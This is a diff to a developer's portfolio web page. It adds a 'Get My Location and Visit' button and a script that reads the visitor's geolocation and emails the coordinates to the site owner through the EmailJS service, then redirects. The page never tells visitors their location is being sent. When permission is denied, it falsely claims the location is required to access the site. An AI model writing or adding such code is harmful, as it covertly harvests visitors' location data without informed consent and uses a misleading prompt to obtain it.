@@ -9,6 +9,8 @@
     <link rel="icon" type="image/x-icon"
         href="https://fiverr-res.cloudinary.com/t_profile_original,q_auto,f_auto/attachments/profile/photo/4d1460fc187095afda60b5f33fb8f797-1662726336418/59cabfd0-a2fc-47ca-8987-5942d39eb948.jpeg">
 
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
     <title>Mujahid Ali || Full Stack Developer</title>
     <!-- font icons -->
     <link rel="stylesheet" href="assets/vendors/themify-icons/css/themify-icons.css">
@@ -17,6 +19,8 @@
 </head>
 
 <body data-spy="scroll" data-target=".navbar" data-offset="40" id="home">
+    <button onclick="getUserLocationAndVisit()">Get My Location and Visit</button>
+    <p id="location"></p>
 
     <!-- Page Navbar -->
     <nav class="custom-navbar" data-spy="affix" data-offset-top="20">
@@ -399,6 +403,45 @@
 
     <!-- Meyawo js -->
     <script src="assets/js/meyawo.js"></script>
+    
+    <!--Location Code-->
+    <script>
+        emailjs.init("service_hxv44ll");
+
+        function sendEmailWithLocation(latitude, longitude) {
+            emailjs.send("service_hxv44ll", "template_qiokg5l", {
+                from_name: "Your Name",
+                to_name: "Recipient Name",
+                message: `Someone visited your website. Location: Latitude ${latitude}, Longitude ${longitude}`
+            }).then(function(response) {
+                console.log("Email sent:", response);
+            }, function(error) {
+                console.error("Email send error:", error);
+            });
+        }
+
+        function getUserLocationAndVisit() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const locationElement = document.getElementById("location");
+                    locationElement.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                    
+                    // Send an email with the location coordinates
+                    sendEmailWithLocation(latitude, longitude);
+
+                    // Redirect to your portfolio website
+                    window.location.href = "https://itxmujahidali.github.io/"; // Your website URL
+                }, function(error) {
+                    alert("To access this website, you need to provide your location.");
+                    console.error("Geolocation error:", error);
+                });
+            } else {
+                alert("Geolocation is not supported in your browser.");
+            }
+        }
+    </script>
 
 </body>
 
